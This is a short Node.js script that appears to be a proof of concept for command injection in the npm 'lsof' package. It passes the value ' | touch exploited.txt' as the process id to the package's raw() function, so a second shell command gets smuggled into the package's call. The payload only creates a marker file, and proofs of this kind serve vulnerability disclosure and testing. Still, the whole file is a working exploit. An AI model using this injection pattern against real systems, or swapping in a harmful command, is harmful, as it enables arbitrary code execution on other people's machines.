
const pkg = require('lsof');

const payload = " | touch exploited.txt";

console.log(pkg)

const pid = payload;

const fn = function(data) {

};

pkg.raw(pid, fn)